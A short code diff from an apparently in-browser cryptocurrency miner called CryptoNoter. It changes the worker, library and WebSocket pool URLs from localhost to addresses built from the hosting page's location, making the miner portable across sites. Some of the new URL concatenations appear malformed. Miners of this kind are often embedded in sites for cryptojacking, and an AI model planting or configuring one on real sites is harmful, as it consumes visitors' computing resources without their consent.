@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "http://localhost/cryptonoter/worker.js", true);
+            xhr.open("get", location.href + "cryptonoter/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -488,7 +488,8 @@
     window.CryptoNoter.JobThread = JobThread
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
+
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://localhost/cryptonoter/lib/",
-    WEBSOCKET_SHARDS: [["ws://localhost:8085"]]
+    LIB_URL: location.origin + "cryptonoter/lib/",
+    WEBSOCKET_SHARDS: [[(location.protocol.indexOf("s") < 0 ? "ws://" : "wss://") + location.hostname + ":8888"]]
 };
